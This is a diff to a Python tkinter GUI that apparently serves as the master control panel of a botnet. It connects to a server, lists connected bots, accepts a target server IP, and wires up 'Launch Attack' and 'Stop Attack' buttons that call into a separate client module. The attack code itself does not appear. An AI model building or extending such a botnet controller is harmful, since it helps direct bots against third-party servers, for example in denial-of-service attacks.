@@ -1,17 +1,16 @@
 import tkinter as tk
 import time
 import socket
+
 master_client = __import__('master-client')
-
-
 
 window = tk.Tk()
 window.botcounter = 0
 
+
 connected = False
-
+running = True
 botlist = ["111", "101", "0.0.0"]
-
 
 frame_a = tk.Frame()
 
@@ -23,16 +22,17 @@ frame_e = tk.Frame(master=window, width=400, height=100, bg="blue")
 frame_c = tk.Frame(master=window, width=400, height=400, bg="blue")
 frame_c.pack(fill=tk.BOTH, side=tk.LEFT, expand=True)
 
+#button commands
 def upload():
     target = Targetip.get()
     if connected == True:
-        send = master_client.Send
         send.targetip = target
-        send.changeip
+        send.changeip()
     print(target)
 
 def connect():
     ip = IRCip.get()
+    global client
     client = master_client.Client(ip, 9090, 'master')
     client.start()
     global connected
@@ -40,8 +40,36 @@ def connect():
     connected = client.authenticated
     if connected == True:
         lightupdate.set(1)
+        global send
+        send = master_client.Send(client.sock)
     print(ip)
 
+
+def quit():
+    if connected == True:
+        send.disconnect()
+
+    global running
+    running = False
+    window.destroy()
+
+def disconnect():
+    if connected == True:
+        send.disconnect()
+
+def launchattack():
+    if connected == True:
+        send.attktype = 1
+        send.changeattk()
+        time.sleep(1)
+        send.startattk()
+
+def stopattack():
+    if connected == True:
+        send.stopattk()
+
+#==================================================================================
+#Button Creation
 for i in range(2):
 
     frame_c.rowconfigure(i, weight=1, minsize=200)
@@ -65,11 +93,11 @@ for i in range(2):
                 label.pack()
                 IRCip.pack()
                 button.pack()
-                button = tk.Button(master=frame, text="Disconnect")
+                button = tk.Button(master=frame, text="Disconnect", command=disconnect)
                 button.pack()
             elif j == 1:
                 label = tk.Label(master=frame, relief=tk.RAISED, borderwidth=1, fg="blue", text="Target Server IP")
-                Targetip= tk.Entry(master=frame)
+                Targetip = tk.Entry(master=frame)
                 label.pack()
                 Targetip.pack()
                 button = tk.Button(master=frame, command=upload, text="Upload")
@@ -83,19 +111,25 @@ for i in range(2):
                 label.pack(side=tk.LEFT)
                 light.pack(padx=2, side=tk.RIGHT)
 
-        elif i == 1 and j < 2:
-            frame.grid(row=i, column=j, padx=5, pady=5)
-            button = tk.Button(master=frame, height=5, width=20, bg="red", text=f"Launch Attack {j + 1}")
+        elif i == 1 and j == 0:
+            frame.grid(row=i, column=j)
+            frame.config(highlightthickness=0, bg="blue", borderwidth=0)
+            launchimg = tk.PhotoImage(file="Art/cpscart2.png")
+            button = tk.Button(master=frame, bg="blue", highlightthickness=0, image=launchimg, borderwidth=0, command=launchattack)
             button.pack(padx=5, pady=5)
+        elif j == 1:
+            frame.grid(row=i, column=j)
+            frame.config(highlightthicknes=0, bg="blue", borderwidth=0)
+            stopimg = tk.PhotoImage(file="Art/cpscart3.png")
+            button = tk.Button(master=frame, image=stopimg, bg="blue", highlightthickness=0, borderwidth=0, command=stopattack)
+            button.pack()
         elif j == 2:
             frame.grid(row=i, column=j)
             frame.config(highlightthickness=0, borderwidth=0, bg="blue")
-            img = tk.PhotoImage(file="cpscArt.png")
+            img = tk.PhotoImage(file="Art/cpscArt.png")
             pic = tk.Canvas(master=frame, bg="blue", highlightthickness=0, relief=tk.FLAT, width=200, height=200)
             pic.pack()
             pic.create_image(30, 2, anchor=tk.NW, image=img)
-
-
 
 scroll = tk.Scrollbar(master=frame_b)
 scroll.pack(side=tk.RIGHT, fill=tk.Y)
@@ -109,16 +143,19 @@ bots.bind(
         scrollregion=canvas.bbox("all")
     ),
 )
-canvas.create_window((0,0), window=bots, anchor="nw")
+canvas.create_window((0, 0), window=bots, anchor="nw")
 canvas.pack(fill=tk.Y, expand=True)
-buttonQ = tk.Button(master=frame_b, text="Quit", width=10, bg="red")
+buttonQ = tk.Button(master=frame_b, text="Quit", width=10, bg="red", command=quit)
 buttonQ.pack(side=tk.BOTTOM)
+#==================================================================================
 
+#event handlers
 def handle_keypress(event):
     window.botcounter += 1
     label1 = tk.Label(master=bots, relief=tk.RAISED, borderwidth=1, fg="green",
                       text=f"BOT {window.botcounter}\nIP: 111.1.111.111\nPort: 25565\nJoined: 00.00")
     label1.pack(padx=5, pady=5)
+
 
 def handle_bots(*args):
     list = bots.pack_slaves()
@@ -129,42 +166,42 @@ def handle_bots(*args):
                           text=f"BOT {i}\nIP: {i}\nPort: 25565\nJoined: 00.00")
         label1.pack(padx=5, pady=5)
 
+
 botupdate = tk.IntVar()
 botupdate.trace("w", handle_bots)
 
+#for bot testing, to be removed later
 def vartest(event):
     botupdate.set(1)
 
-
+#light-switch handler
 def handle_light(*args):
     light.create_oval(coordinates, fill="green", width=2)
 
+#binding widget functions
 lightupdate = tk.IntVar()
 lightupdate.trace("w", handle_light)
 
-
 window.bind("<Key a>", handle_keypress)
 window.bind("<Key b>", vartest)
-#window.bind("<Key c>", handle_light)
 
 label_a = tk.Label(master=frame_a, relief=tk.RAISED, borderwidth=5, text="Connected Bots")
 label_a.pack(padx=5)
 
-# frame_e.pack(fill=tk.BOTH, side=tk.TOP, expand=True)
+#packing frames
 frame_c.pack(fill=tk.BOTH, side=tk.LEFT, expand=True)
 frame_a.pack()
 frame_b.pack(fill=tk.Y, expand=True)
 
-#window.mainloop()
-while 1:
+#replacement of window.mainloop()
+while running == True:
     if connected == True:
         handle_light
         oldlist = botlist
-        botlist = master_client.botlist
+       # botlist = master_client.botlist
         if botlist != oldlist:
             botupdate.set(1)
             continue
     window.update_idletasks()
     window.update()
     time.sleep(0.01)
-
